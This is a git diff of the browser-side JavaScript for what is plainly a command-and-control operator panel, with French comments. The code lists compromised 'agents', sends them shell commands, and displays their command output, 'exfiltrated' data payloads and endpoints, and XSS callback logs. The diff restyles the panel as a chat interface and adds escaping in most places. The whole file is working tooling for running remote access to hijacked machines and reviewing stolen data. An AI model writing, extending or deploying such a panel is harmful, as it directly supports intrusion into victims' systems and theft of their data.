@@ -1,182 +1,180 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const agentList = document.getElementById('agent-list');
-    const agentSelect = document.getElementById('agent-select');
-    const commandInput = document.getElementById('command-input');
-    const sendCommandBtn = document.getElementById('send-command');
-    const commandHistoryList = document.getElementById('command-history-list');
-    const logsContainer = document.getElementById('logs-container');
-    const activeAgentsSpan = document.getElementById('active-agents');
-    const pendingCommandsSpan = document.getElementById('pending-commands');
-    const exfilDataSpan = document.getElementById('exfil-data');
-    
-    let selectedAgent = null;
-    let refreshInterval = null;
-    
-    // Fonction pour mettre à jour les statistiques
-    async function updateStats() {
-        try {
-            const response = await fetch('/agents');
-            const data = await response.json();
-            
-            activeAgentsSpan.textContent = data.agents.length;
-            
-            // Calcul des commandes en attente
-            const pendingCommands = data.agents.reduce(
-                (total, agent) => total + agent.commandCount, 0
-            );
-            pendingCommandsSpan.textContent = pendingCommands;
-            
-            // Mise à jour des données exfiltrées
-            if (selectedAgent) {
-                const exfilResponse = await fetch(`/monitor/${selectedAgent}/exfiltrated`);
-                const exfilData = await exfilResponse.json();
-                exfilDataSpan.textContent = exfilData.data?.length || 0;
-            }
-        } catch (error) {
-            console.error('Error updating stats:', error);
-        }
+let currentAgentId = null;
+let agentsCache = [];
+let exfilsCache = {};
+
+async function fetchAgents() {
+    const res = await fetch('/agents');
+    const data = await res.json();
+    return data.agents || [];
+}
+async function fetchLogs(agentId) {
+    const res = await fetch(`/monitor/${agentId}`);
+    const data = await res.json();
+    return data.logs || [];
+}
+async function fetchExfiltration(agentId) {
+    const res = await fetch(`/monitor/${agentId}/exfiltrated`);
+    const data = await res.json();
+    return data.data || [];
+}
+async function fetchCommandsHistory(agentId) {
+    const res = await fetch(`/monitor/${agentId}/commands/history`);
+    const data = await res.json();
+    return data.history || [];
+}
+async function fetchPendingCommands() {
+    let total = 0;
+    for (const agent of agentsCache) total += agent.commandCount || 0;
+    return total;
+}
+
+function escapeHtml(str) {
+    return String(str).replace(/[&<>"']/g, s =>
+        ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s])
+    );
+}
+
+// -------- AGENT LIST & SELECT ---------
+function renderAgentList(agents) {
+    const list = document.getElementById('agent-list');
+    list.innerHTML = '';
+    agents.forEach(agent => {
+        const div = document.createElement('div');
+        div.className = 'agent-card' + (agent.id === currentAgentId ? ' selected' : '');
+        div.innerHTML = `
+            <div><strong>${agent.id}</strong></div>
+            <div class="mini">${agent.info.platform || '-'}</div>
+            <div class="mini">Vu: ${new Date(agent.lastSeen).toLocaleTimeString()}</div>
+            <button class="btn-exfil" data-agent="${agent.id}">Exfils</button>
+        `;
+        div.onclick = e => {
+            if (e.target.classList.contains('btn-exfil')) return;
+            currentAgentId = agent.id;
+            renderAgentList(agentsCache);
+            loadChat();
+        };
+        div.querySelector('.btn-exfil').onclick = async e => {
+            e.stopPropagation();
+            currentAgentId = agent.id;
+            renderAgentList(agentsCache);
+            showExfils();
+        };
+        list.appendChild(div);
+    });
+}
+
+// -------- IA-STYLE CHAT MAIN PANEL ---------
+function msgBox({type, content, time}) {
+    let cls = "msg ";
+    if (type === "agent") cls += "agent";
+    else if (type === "cmd") cls += "cmd";
+    else if (type === "exfil") cls += "exfil";
+    else cls += "c2";
+    return `<div class="${cls}">
+        ${content}
+        <div class="msg time">${time ? new Date(time).toLocaleString() : ""}</div>
+    </div>`;
+}
+
+async function loadChat() {
+    if (!currentAgentId) {
+        document.getElementById('ia-messages').innerHTML = "<div class='msg c2'>Sélectionnez un agent à gauche pour commencer.</div>";
+        return;
     }
-    
-    // Fonction pour charger les agents
-    async function loadAgents() {
-        try {
-            const response = await fetch('/agents');
-            const data = await response.json();
-            
-            agentList.innerHTML = '';
-            agentSelect.innerHTML = '<option value="">Sélectionner un agent</option>';
-            
-            data.agents.forEach(agent => {
-                // Ajout à la liste des agents
-                const agentCard = document.createElement('div');
-                agentCard.className = 'agent-card';
-                if (selectedAgent === agent.id) {
-                    agentCard.classList.add('active');
-                }
-                
-                agentCard.innerHTML = `
-                    <h3>${agent.id}</h3>
-                    <div class="agent-info">
-                        <div><strong>Platform:</strong> ${agent.info.platform || 'N/A'}</div>
-                        <div><strong>User:</strong> ${agent.info.user || 'N/A'}</div>
-                        <div><strong>Last Seen:</strong> ${new Date(agent.lastSeen).toLocaleString()}</div>
-                        <div><strong>Pending Commands:</strong> ${agent.commandCount}</div>
-                    </div>
-                `;
-                
-                agentCard.addEventListener('click', () => {
-                    selectedAgent = agent.id;
-                    loadAgentDetails(agent.id);
-                    loadCommandHistory(agent.id);
-                    document.querySelectorAll('.agent-card').forEach(card => {
-                        card.classList.remove('active');
-                    });
-                    agentCard.classList.add('active');
-                });
-                
-                agentList.appendChild(agentCard);
-                
-                // Ajout au menu déroulant
-                const option = document.createElement('option');
-                option.value = agent.id;
-                option.textContent = agent.id;
-                agentSelect.appendChild(option);
-            });
-            
-            updateStats();
-        } catch (error) {
-            console.error('Error loading agents:', error);
+    const logs = await fetchLogs(currentAgentId);
+    const cmds = await fetchCommandsHistory(currentAgentId);
+    let html = '';
+    let combined = [];
+
+    // Combine logs (exfil, command_result, etc.) and commands (sent)
+    logs.forEach(l => {
+        if (l.result && l.result.type === "command_result") {
+            combined.push({type:"agent", content: `<b>Résultat:</b><pre style="margin:2px 0 0 0;font-size:12px">${escapeHtml(l.result.data.result).slice(0,600)}</pre>`, time: l.time});
+        } else if (l.result && l.result.type === "exfiltration") {
+            let val = l.result.data;
+            combined.push({type:"exfil", content: `<b>Exfil ${escapeHtml(val.data_type)}</b><br><code>${escapeHtml(JSON.stringify(val.content)).slice(0,400)}</code>`, time: l.time});
         }
-    }
-    
-    // Fonction pour charger les détails d'un agent
-    async function loadAgentDetails(agentId) {
-        try {
-            const response = await fetch(`/monitor/${agentId}`);
-            const data = await response.json();
-            
-            logsContainer.innerHTML = '';
-            
-            data.logs.forEach(log => {
-                const logEntry = document.createElement('div');
-                logEntry.className = 'log-entry';
-                
-                logEntry.innerHTML = `
-                    <div class="log-time">${log.time}</div>
-                    <pre class="log-content">${log.result}</pre>
-                `;
-                
-                logsContainer.appendChild(logEntry);
-            });
-            
-            // Faire défiler vers le bas
-            logsContainer.scrollTop = logsContainer.scrollHeight;
-        } catch (error) {
-            console.error('Error loading agent details:', error);
-        }
-    }
-    
-    // Fonction pour charger l'historique des commandes
-    async function loadCommandHistory(agentId) {
-        try {
-            const response = await fetch(`/monitor/${agentId}/commands/history`);
-            const data = await response.json();
-            
-            commandHistoryList.innerHTML = '';
-            
-            data.history.forEach(item => {
-                const li = document.createElement('li');
-                li.innerHTML = `
-                    <strong>${new Date(item.timestamp).toLocaleString()}:</strong>
-                    <code>${item.command}</code>
-                `;
-                commandHistoryList.appendChild(li);
-            });
-        } catch (error) {
-            console.error('Error loading command history:', error);
-        }
-    }
-    
-    // Envoyer une commande
-    sendCommandBtn.addEventListener('click', async () => {
-        const command = commandInput.value.trim();
-        const agentId = agentSelect.value;
-        
-        if (!command || !agentId) {
-            alert('Veuillez sélectionner un agent et saisir une commande');
-            return;
-        }
-        
-        try {
-            const response = await fetch(`/monitor/${agentId}/commands`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ command })
-            });
-            
-            const result = await response.json();
-            
-            if (response.ok) {
-                commandInput.value = '';
-                loadCommandHistory(agentId);
-                updateStats();
-            } else {
-                alert(`Erreur: ${result.error || 'Unknown error'}`);
-            }
-        } catch (error) {
-            console.error('Error sending command:', error);
-            alert('Erreur de communication avec le serveur');
+        // Ajoute aussi les logs génériques
+        else if (typeof l.result === "string" && l.result.startsWith("XSS Callback")) {
+            combined.push({type:"exfil", content: `<b>XSS Callback</b><br><code>${escapeHtml(l.result).slice(0,350)}</code>`, time: l.time});
         }
     });
-    
-    // Initialisation
-    loadAgents();
-    refreshInterval = setInterval(loadAgents, 5000);
-    
-    // Nettoyage à la fermeture
-    window.addEventListener('beforeunload', () => {
-        if (refreshInterval) clearInterval(refreshInterval);
+    cmds.forEach(cmd => {
+        combined.push({type:"cmd", content: `<b>Commande envoyée:</b> <code>${escapeHtml(cmd.command)}</code>`, time: cmd.timestamp});
     });
+
+    // Tri chronologique
+    combined = combined.sort((a,b)=>new Date(a.time)-new Date(b.time)).slice(-40);
+
+    html = combined.map(msgBox).join('');
+    document.getElementById('ia-messages').innerHTML = html || "<div class='msg c2'>Aucune activité récente.</div>";
+    scrollToBottom();
+}
+
+function scrollToBottom() {
+    setTimeout(()=>{
+        const m = document.getElementById('ia-messages');
+        m.scrollTop = m.scrollHeight;
+    }, 100);
+}
+
+async function showExfils() {
+    if (!currentAgentId) return;
+    const exfils = await fetchExfiltration(currentAgentId);
+    exfilsCache[currentAgentId] = exfils;
+    let html = '';
+    if (!exfils.length) html = "<div class='msg c2'>Aucune donnée exfiltrée.</div>";
+    else {
+        html = exfils.slice(-15).reverse().map(entry => `
+            <div class="msg exfil">
+                <b>Type:</b> ${escapeHtml(entry.type)}<br>
+                <b>Date:</b> ${new Date(entry.timestamp).toLocaleString()}<br>
+                <b>Payload:</b> <span class="payload">${entry.data.payload ? escapeHtml(entry.data.payload).slice(0,350) + (entry.data.payload.length>350?' ...':'') : '-'}</span><br>
+                ${entry.data.endpoints ? `<b>Endpoints:</b><ul>${entry.data.endpoints.map(ep=>`<li>${escapeHtml(ep)}</li>`).join('')}</ul>` : ''}
+                ${Object.keys(entry.data).filter(k=>k!=='payload'&&k!=='endpoints').map(k=>`<b>${escapeHtml(k)}:</b> ${escapeHtml(JSON.stringify(entry.data[k]))}<br>`).join('')}
+            </div>
+        `).join('');
+    }
+    document.getElementById('ia-messages').innerHTML = html;
+    scrollToBottom();
+}
+
+// -------- ENVOI DE COMMANDE SHELL ---------
+document.addEventListener('DOMContentLoaded', ()=>{
+    document.getElementById('ia-form').onsubmit = async e => {
+        e.preventDefault();
+        if (!currentAgentId) return alert("Sélectionnez un agent !");
+        const input = document.getElementById('ia-input');
+        const val = input.value.trim();
+        if (!val) return;
+        await fetch(`/monitor/${currentAgentId}/commands`, {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({command: val})
+        });
+        input.value = "";
+        loadChat();
+    };
+});
+
+// --------- GLOBAL REFRESH & STATS ---------
+async function refreshAll() {
+    agentsCache = await fetchAgents();
+    renderAgentList(agentsCache);
+    let exfilTotal = 0;
+    for (const agent of agentsCache) {
+        let exfils = exfilsCache[agent.id];
+        if (!exfils) exfils = await fetchExfiltration(agent.id);
+        exfilTotal += exfils.length;
+    }
+    const pendingCmds = await fetchPendingCommands();
+    document.getElementById('active-agents').textContent = agentsCache.length;
+    document.getElementById('exfil-data').textContent = exfilTotal;
+    document.getElementById('pending-commands').textContent = pendingCmds;
+    loadChat();
+}
+
+document.addEventListener('DOMContentLoaded', ()=>{
+    refreshAll();
+    setInterval(refreshAll, 7000);
 });
